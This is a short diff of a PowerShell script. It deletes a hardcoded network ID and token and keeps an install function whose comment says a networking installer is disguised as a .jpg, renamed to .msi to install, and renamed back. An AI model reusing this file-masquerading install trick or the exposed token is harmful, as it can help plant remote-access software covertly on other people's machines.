@@ -1,6 +1,3 @@
-﻿$NetworkID= '41d49af6c2346b66'
-$token= 'DcRpJpGbcAeOUWpcxXgMat0OLjHZBiqf'
-
 function install-ZT ($path_to_installer){
     #Zt is masquerading as a .jpg. Rename it to .msi, install it and rename it back to jpg.
     $old_name= $path_to_installer
